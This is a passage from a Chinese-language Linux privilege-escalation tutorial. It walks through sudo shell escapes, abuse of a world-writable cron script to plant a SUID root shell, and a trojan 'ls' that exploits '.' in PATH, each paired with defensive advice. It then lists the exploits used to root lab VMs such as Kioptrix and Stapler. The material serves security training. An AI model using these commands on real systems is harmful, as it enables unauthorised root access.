    $ sudo python -c 'import pty;pty.spawn("/bin/bash");' - 产生一个Shell。
防范方法：  
不要将SUDO权限授予任何允许逃逸到Shell的程序。  
不要将SUDO权限赋予vi、more、less、perl、ruby、gdb等命令。
###  5\. 利用未正确配置的CRON任务
如果Cron任务配置不当，可能会被利用获取root权限。  
(1) 任何可写的Cron任务脚本或二进制文件？  
(2) 我们是否可以自己覆盖写入Cron文件？  
(3) cron.d目录是否可写入？  
Cron任务常常以root权限运行。如果我们可以成功篡改Cron任务中定义的任何脚本或二进制文件，我们便可以使用root权限执行任意代码。  
利用错误配置的Cron任务来获取root1访问权限：
    $ ls -la /etc/cron.d - 打印cron.d中已经存在的Cron任务。
    $ find / -perm -2 -type f 2>/dev/null - 打印全局可写入文件。
    $ ls -la /usr/local/sbin/cron-logrotate.sh - 确认cron-logrotate.sh是否是全局可写入的。
    > cron-logrotate.sh是全局可写入的，它由cronjob运行。我们在cron-logrotate.sh中写入/添加的任何命令都会以root身份执行。
    > 我们在/tmp目录下编写一个C文件，并对其进行编译。
    > rootme可执行文件会产生一个Shell。
    $ ls -la rootme - 说明该文件由用户SHayslett拥有。
    $ echo "chown root:root /tmp/rootme; chmod u+s /tmp/rootme;">/usr/local/sbin/cron-logrotate.sh - 将可执行文件的所有者和分组修改为root，同时也会设置SUID位。
    $ ls -la rootme - 在5分钟后，运行logrotate Cron任务，cron-logrotate.sh会以root权限执行。
    $ ./rootme - 产生一个root Shell。
防范方法：  
在Cron任务中定义的任何脚本或二进制文件都不应该是可写入的。  
Cron文件不应被除root之外的任何用户写入。  
Cron.d目录不应被除root之外的任何用户写入。
###  6\. 在用户路径上利用’.’实现利用
如果PATH中带有’.’，就意味着用户可以从当前目录执行二进制文件或脚本。为了变每次都输入这两个额外的字符，用户可能会将’.’添加到他们的PATH中。对于攻击者来说，这是一个用于权限提升的不错方式。  
假如Susan是一名管理员，她在她的路径中添加了’.’，这样就不必再写入两个字符。  
路径中有’.’ – program  
路径中没有’.’ – ./program  
这种情况的原因在于，Linux会首先在PATH中添加’.’，然后在其他地方进行搜索时，会首先在当前目录中搜索程序。
    > 假设另一个用户rashid知道Susan在她的PATH中加入了'.'。
    > rashid告诉Susan说，'ls'命令在他的目录下不起作用。
    > rashid在他的目录中添加一个代码，该代码可以更改sudoers文件，使rashid成为管理员。
    > rashid将该代码保存在名为'ls'的文件中并使其可执行。
    > Susan拥有root权限，她在rashid的主目录下执行了'ls'命令。
    > 恶意代码将会代替原来的'ls'命令，以root权限执行。
    > 在名称为"ls"的文件中，添加了一行代码，该代码将会打印出"Hello World"。
    $ PATH=.:${PATH} - 将'.'添加到PATH变量中。
    $ ls - 执行./ls文件，而不是执行list命令。
    > 现在，如果root用户以root权限执行代码，我们就可以使用root权限实现任意代码执行。
防范方法：  
不要将’.’放在你的路径中。
## 不同虚拟机环境上的权限提升方法
目前，我已经编译了一系列不同的权限提升方法，并且成功在不同的虚拟机上获得了root权限。我们在这里提供一个整体思路，也就是告诉大家如何在实际场景中使用上述技术。很多时候，可以选择多种技术在同一台机器上获得”root”访问权限。
  1. Kioptrix 1  
内核漏洞攻击 – Apache mod_ssl  )  
SMB漏洞利用 – Samba(2.2.1a) trans2open缓冲区溢出(  )
  2. Kioptrix 2  
内核漏洞利用 – Linux Kernel 2.6  )
  3. Kioptrix 3  
在文件编辑器上设置SUID位 – 编辑/etc/sudoers文件以获得SUDO权限
  4. Kioptrix 4  
内核漏洞利用 – ‘Dirty COW’ ‘PTRACE_POKEDATA’竞争条件权限提升(  )  
MySQL漏洞利用 – MySQL 4.x/5.0 (Linux) – 用户定义函数（UDF）动态库(2)(  )  
内核漏洞利用 – 2.4/2.6 sock_sendpage() ring0 Root利用(
 )
  5. Kioptrix 5  
内核漏洞利用 – FreeBSD 9.0 – Intel SYSRET内核权限提升(  )
  6. SickOS 1.2  
未正确配置的Cron任务 – Chkrootkit 0.49 – 本地权限提升(  )
  7. Stapler  
正在运行的受漏洞影响版本Samba – SambaCry利用(
 )  
未正确配置的Cron任务 – 全局可写cron文件  
在.bash_history中找到root密码  
内核漏洞利用 – Linux Kernel 4.4.x (Ubuntu 16.04) – ‘double-fdput()’
bpf(BPF_PROG_LOAD) 权限提升(  )
  8. Troll1  
Sudo su得到root权限
  9. MrRobot  
在nmap上设置SUID位 – 从nmap交互模式转到Shell
  10. Vulnix  
未正确配置的服务 – root_squash目录装载错误配置
  11. droopy  
内核漏洞利用 – ‘overlayfs’权限提升(  )
  12. VulnOsv2  
内核漏洞利用 – ‘overlayfs’权限提升(  )
  13. Fristileaks  
SUDO权限赋予一个易受攻击的二进制文件
  14. LordOfTheRoot  
内核漏洞利用 – ‘overlayfs’权限提升(  )
## 重要资源
大家可以参考这些博客文章，以便更好地了解Linux权限提升的相关知识。  
基础的Linux权限提升：  
本地Linux遍历和权限提升备忘录：  
黑客入侵Linux第一部分-权限提升：  
权限提升：  
以下是遍历脚本。尽管我们建议手动进行便利，但使用脚本无疑会更为便捷，但运行脚本可能会产生一些误报。  
unix-privesc-check：  
Linuxprivchecker（我的最爱）：  
LinEnum：
## 参考